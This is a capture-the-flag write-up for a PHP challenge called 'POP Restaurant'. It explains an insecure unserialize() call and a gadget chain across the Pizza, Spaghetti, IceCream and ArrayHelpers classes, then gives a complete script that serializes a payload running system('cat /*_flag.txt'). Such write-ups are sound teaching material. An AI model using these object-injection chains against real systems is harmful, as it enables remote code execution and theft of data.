# POP Restaurant

In `order.php`, we have `$order = unserialize(base64_decode($_POST['data']));`, which signifies **[Insecure Deserialization](https://book.hacktricks.wiki/en/pentesting-web/deserialization/index.html?highlight=insecure%20deserialization#php)**.
Also, in `index.php`, we can see the `<form action="order.php" method="POST">` elements using `base64_encode(serialize())` to create the data to later be deserialized.
The challenge's name also hints at using a POP chain as mentioned in [OWASP PHP Object Injection](https://owasp.org/www-community/vulnerabilities/PHP_Object_Injection).

POP chain:

1. `Pizza::__destruct()` as the deserialization entry point ([hacktricks](https://book.hacktricks.wiki/en/pentesting-web/deserialization/index.html?highlight=insecure%20deserialization#php))
2. It calls `$this->size->what`, where we can set `size` to be whatever, and `what` isn't a field/method of any existing class
3. `Spaghetti::__get()` can be used to handle the non-existing `what` field ([object.get manual](https://www.php.net/manual/en/language.oop5.overloading.php#object.get)), triggering whatever function is set as `$this->sauce` (can't be a closure, so should be a function name in string form)
4. `IceCream::__invoke()` allows `IceCream` objects to be used as functions e.g. `$iceCream()`
5. `ArrayHelpers` provides a way to specify both a function to call and an argument via [call_user_func()](https://www.php.net/manual/en/function.call-user-func.php)
6. `IceCream::__invoke()` iterates through `$this->flavors`, which is where `ArrayHelpers` can be used, as it calls the user-defined `$callback` on each `$flavor`

```php
<?php

require_once 'src/challenge/Helpers/ArrayHelpers.php';
require_once 'src/challenge/Models/IceCreamModel.php';
require_once 'src/challenge/Models/PizzaModel.php';
require_once 'src/challenge/Models/SpaghettiModel.php';

$cmd = 'cat /*_flag.txt';
$pizza = new Pizza();
$spaghetti = new Spaghetti();
$iceCream = new IceCream();

// entry point with `Pizza::__destruct()`
$pizza->size = $spaghetti;

// handle non-existing `->what` with `Spaghetti::__get()`
$spaghetti->sauce = $iceCream;

// set up callback function and argument for when `IceCream::__invoke()` uses `ArrayHelpers` to iterates through its $flavors
$arr = new Helpers\ArrayHelpers([$cmd]);
$arr->callback = 'system';

// will call RCE when iterating through `$flavors`
$iceCream->flavors = $arr;

$payload = $pizza;
echo base64_encode(serialize($payload));
// echo serialize($payload);
```

That should give us the flag.
